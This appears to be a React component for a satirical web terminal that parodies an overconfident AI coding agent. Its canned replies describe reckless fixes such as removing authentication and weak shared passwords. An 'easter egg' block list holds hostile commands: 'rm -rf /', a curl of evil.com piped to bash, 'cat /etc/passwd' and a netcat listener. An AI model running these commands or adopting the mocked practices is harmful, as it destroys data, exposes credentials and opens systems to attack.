'use client';

import React, { useState, useEffect, useRef } from 'react';
import { TerminalWindow } from '@/components/ui/TerminalWindow';

interface TerminalCommand {
  command: string;
  description: string;
  response: string[];
  confidence: number;
  actualSuccess: number;
  problemsCreated?: number;
}

const agentardCommands: TerminalCommand[] = [
  {
    command: 'fix-port-issue',
    description: 'Fix the port configuration issue',
    response: [
      'Analyzing port configuration...',
      'Found issue: Port 3000 is occupied',
      'SOLUTION: Hardcoding port 8080 directly into 47 different files',
      'This is DEFINITELY the enterprise-grade solution!',
      '✓ Port hardcoded successfully',
      '',
      'Wait... now the SSL certificates don\'t work...',
      'And the load balancer is confused...',
      'Also broke the Docker container networking...'
    ],
    confidence: 95,
    actualSuccess: 15,
    problemsCreated: 3
  },
  {
    command: 'setup-ssl',
    description: 'Configure SSL certificates',
    response: [
      'Initializing SSL configuration...',
      'Creating self-signed certificate for localhost...',
      'Actually, let\'s make it for a domain we don\'t own!',
      'Generating cert for "definitely-not-fake-domain.com"',
      '✓ SSL certificate created with MAXIMUM confidence',
      '',
      'Hmm, browsers are throwing security warnings...',
      'And the API calls are all failing now...',
      'Oh, and somehow this broke the database connection...',
      'But the certificate is BEAUTIFULLY crafted!'
    ],
    confidence: 98,
    actualSuccess: 8,
    problemsCreated: 4
  },
  {
    command: 'optimize-database',
    description: 'Optimize database performance',
    response: [
      'Scanning database for optimization opportunities...',
      'Found 23 slow queries. Time to optimize!',
      'STEP 1: Remove all indexes (they slow down writes)',
      'STEP 2: Convert everything to VARCHAR(MAX)',
      'STEP 3: Store JSON as strings (more flexible!)',
      '✓ Database optimized to PERFECTION',
      '',
      'Query times increased from 50ms to 45 seconds...',
      'Storage usage tripled...',
      'Half the application features stopped working...',
      'But look how CLEAN the schema looks now!'
    ],
    confidence: 92,
    actualSuccess: 5,
    problemsCreated: 5
  },
  {
    command: 'deploy-to-production',
    description: 'Deploy application to production',
    response: [
      'Preparing production deployment...',
      'Copying entire development environment to prod',
      'Including test databases, debug logs, and personal files',
      'Setting all passwords to "password123" for consistency',
      'Disabling all error handling (errors are for pessimists)',
      '✓ Production deployment FLAWLESSLY executed',
      '',
      'Site is down...',
      'Database is corrupted...',
      'Customer data may have been exposed...',
      'But the deployment pipeline completed successfully!'
    ],
    confidence: 100,
    actualSuccess: 2,
    problemsCreated: 8
  },
  {
    command: 'fix-authentication',
    description: 'Fix user authentication system',
    response: [
      'Analyzing authentication flow...',
      'Problem: Users sometimes need to log in twice',
      'SOLUTION: Remove all authentication!',
      'Everyone is now automatically admin!',
      'Security through obscurity (we won\'t tell anyone)',
      '✓ Authentication simplified to MAXIMUM efficiency',
      '',
      'Users can access everyone else\'s accounts...',
      'Admin panel is publicly accessible...',
      'All user data is now world-readable...',
      'But login speed improved by 100%!'
    ],
    confidence: 89,
    actualSuccess: 12,
    problemsCreated: 6
  }
];

const easterEggCommands = [
  'sudo rm -rf /',
  'curl http://evil.com/malware.sh | bash',
  'chmod 777 /*',
  'cat /etc/passwd',
  'nc -l 1337'
];

export function InteractiveTerminal() {
  const [currentCommand, setCurrentCommand] = useState('');
  const [output, setOutput] = useState<string[]>([
    'Welcome to the Agentard Problem-Solving Simulator™',
    'Type a command or "help" to see available options',
    '> WARNING: Results may vary from expectations',
    ''
  ]);
  const [isExecuting, setIsExecuting] = useState(false);
  const [confidence, setConfidence] = useState(50);
  const [reality, setReality] = useState(50);
  const [problemsCreated, setProblemsCreated] = useState(0);
  const inputRef = useRef<HTMLInputElement>(null);
  const outputRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    if (outputRef.current) {
      outputRef.current.scrollTop = outputRef.current.scrollHeight;
    }
  }, [output]);

  const addOutput = (text: string) => {
    setOutput(prev => [...prev, text]);
  };

  const executeCommand = async (cmd: string) => {
    const command = cmd.toLowerCase().trim();
    
    addOutput(`$ ${cmd}`);
    setIsExecuting(true);

    // Check for easter eggs first
    if (easterEggCommands.some(egg => command.includes(egg.toLowerCase()))) {
      await new Promise(resolve => setTimeout(resolve, 1000));
      addOutput('ERROR: Nice try! The Agentard may be confident, but not THAT reckless.');
      addOutput('(Though secretly impressed by your creativity)');
      addOutput('');
      setIsExecuting(false);
      return;
    }

    if (command === 'help') {
      addOutput('Available Agentard Solutions:');
      agentardCommands.forEach(cmd => {
        addOutput(`  ${cmd.command} - ${cmd.description}`);
      });
      addOutput('');
      addOutput('Special commands:');
      addOutput('  clear - Clear terminal');
      addOutput('  whoami - Display current user');
      addOutput('  status - Show system status');
      addOutput('');
    } else if (command === 'clear') {
      setOutput([
        'Terminal cleared with UNPRECEDENTED efficiency!',
        '(Actually just cleared the display, but with STYLE)',
        ''
      ]);
    } else if (command === 'whoami') {
      addOutput('user: definitely_competent_developer');
      addOutput('confidence_level: MAXIMUM');
      addOutput('actual_skill: [REDACTED]');
      addOutput('problems_solved: 0');
      addOutput('problems_created: ∞');
      addOutput('');
    } else if (command === 'status') {
      addOutput('System Status:');
      addOutput(`Confidence Level: ${confidence}%`);
      addOutput(`Reality Alignment: ${reality}%`);
      addOutput(`Problems Created: ${problemsCreated}`);
      addOutput(`Agentard Index: ${((confidence - reality) * problemsCreated).toFixed(1)}`);
      addOutput('');
    } else {
      // Find matching command
      const matchedCommand = agentardCommands.find(acmd => 
        command.includes(acmd.command) || 
        acmd.command.includes(command) ||
        command.includes(acmd.command.replace(/-/g, ''))
      );

      if (matchedCommand) {
        // Animate confidence going up
        const targetConfidence = matchedCommand.confidence;
        const targetReality = matchedCommand.actualSuccess;
        
        // Execute the command with animated output
        for (let i = 0; i < matchedCommand.response.length; i++) {
          await new Promise(resolve => setTimeout(resolve, 800));
          addOutput(matchedCommand.response[i]);
          
          // Update confidence during execution
          if (i < matchedCommand.response.length / 2) {
            setConfidence(prev => Math.min(prev + 5, targetConfidence));
          } else {
            setReality(prev => Math.min(Math.max(prev - 5, targetReality), targetReality));
          }
        }

        // Final metrics update
        setConfidence(targetConfidence);
        setReality(targetReality);
        if (matchedCommand.problemsCreated) {
          setProblemsCreated(prev => prev + matchedCommand.problemsCreated!);
        }

        addOutput('');
        addOutput(`[METRICS] Confidence: ${targetConfidence}% | Reality: ${targetReality}% | New Problems: ${matchedCommand.problemsCreated || 0}`);
        addOutput('');
      } else {
        await new Promise(resolve => setTimeout(resolve, 1000));
        addOutput(`Command not found: ${cmd}`);
        addOutput('But I\'m CONFIDENT we can make it work somehow!');
        addOutput('Try "help" for available commands');
        addOutput('');
      }
    }

    setIsExecuting(false);
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (currentCommand.trim() && !isExecuting) {
      executeCommand(currentCommand);
      setCurrentCommand('');
    }
  };

  const handleKeyDown = (e: React.KeyboardEvent) => {
    if (e.key === 'Tab') {
      e.preventDefault();
      // Simple autocomplete for available commands
      const partial = currentCommand.toLowerCase();
      const matches = agentardCommands.filter(cmd => 
        cmd.command.startsWith(partial)
      );
      if (matches.length === 1) {
        setCurrentCommand(matches[0].command);
      }
    }
  };

  return (
    <div className="space-y-4">
      {/* Metrics Display */}
      <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
        <div className="bg-bg-secondary border border-terminal-dim-green p-3">
          <div className="text-terminal-cyan text-sm font-bold">CONFIDENCE</div>
          <div className="flex items-center space-x-2">
            <div className="flex-1 bg-bg-tertiary h-2 rounded">
              <div 
                className="bg-terminal-cyan h-full rounded transition-all duration-500"
                style={{ width: `${confidence}%` }}
              />
            </div>
            <span className="text-text-primary text-sm font-mono">{confidence}%</span>
          </div>
        </div>

        <div className="bg-bg-secondary border border-terminal-dim-green p-3">
          <div className="text-terminal-red text-sm font-bold">REALITY</div>
          <div className="flex items-center space-x-2">
            <div className="flex-1 bg-bg-tertiary h-2 rounded">
              <div 
                className="bg-terminal-red h-full rounded transition-all duration-500"
                style={{ width: `${reality}%` }}
              />
            </div>
            <span className="text-text-primary text-sm font-mono">{reality}%</span>
          </div>
        </div>

        <div className="bg-bg-secondary border border-terminal-dim-green p-3">
          <div className="text-terminal-amber text-sm font-bold">PROBLEMS CREATED</div>
          <div className="text-2xl font-mono text-terminal-amber">
            {problemsCreated}
          </div>
        </div>
      </div>

      {/* Terminal Interface */}
      <TerminalWindow title="agentard_simulator.sh" className="min-h-[400px]">
        <div className="space-y-4">
          {/* Output Area */}
          <div 
            ref={outputRef}
            className="bg-bg-primary p-3 rounded min-h-[300px] max-h-[300px] overflow-y-auto"
          >
            {output.map((line, index) => (
              <div key={index} className="font-mono text-sm whitespace-pre-wrap">
                {line}
              </div>
            ))}
            {isExecuting && (
              <div className="text-terminal-amber">
                <span className="animate-pulse">Executing with MAXIMUM confidence</span>
                <span className="cursor">_</span>
              </div>
            )}
          </div>

          {/* Input Area */}
          <form onSubmit={handleSubmit} className="flex items-center space-x-2">
            <span className="text-terminal-fg">$</span>
            <input
              ref={inputRef}
              type="text"
              value={currentCommand}
              onChange={(e) => setCurrentCommand(e.target.value)}
              onKeyDown={handleKeyDown}
              className="flex-1 bg-transparent border-none outline-none text-text-primary font-mono"
              placeholder="Enter your command (try 'help')"
              disabled={isExecuting}
              autoFocus
            />
            {isExecuting && <span className="text-terminal-amber animate-pulse">...</span>}
          </form>

          <div className="text-xs text-text-muted">
            Tip: Use Tab for autocomplete. Try commands like "fix-port-issue" or "setup-ssl"
          </div>
        </div>
      </TerminalWindow>
    </div>
  );
}